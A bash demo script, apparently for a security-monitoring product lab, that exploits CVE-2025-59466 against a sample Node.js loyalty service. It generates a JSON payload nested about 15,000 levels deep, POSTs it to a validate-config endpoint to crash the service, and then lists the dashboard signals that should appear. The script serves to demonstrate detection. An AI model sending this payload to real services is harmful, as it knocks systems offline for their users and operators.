#!/usr/bin/env bash
# Demo: DoS via deeply nested JSON (CVE-2025-59466)
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/_common.sh"

banner "DoS via Nested JSON" \
       "corndog-loyalty (Node.js/Express)" \
       "Security Research Feed + Workload Protection" \
       "CVE-2025-59466"

echo -e "${YLW}  Generating ~15,000-level nested JSON payload…${RST}"
echo ""

PAYLOAD=$(python3 -c "
import json
obj = {'value': 'leaf'}
for _ in range(15000):
    obj = {'rules': obj}
print(json.dumps(obj))
")

run_curl "Sending deeply nested JSON to validate-config endpoint" \
  -X POST "${BASE_URL}/api/loyalty/validate-config" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"

echo -e "${YLW}  The loyalty service will crash (stack overflow + AsyncLocalStorage).${RST}"
echo -e "${YLW}  It auto-restarts via Docker restart: on-failure.${RST}"
echo ""

dd_signal \
  "Security > Security Research Feed — CVE-2025-59466 marked 'Impacted'" \
  "APM > Services > corndog-loyalty — error spike / restart" \
  "Infrastructure > Containers — corndog-loyalty container restart event"
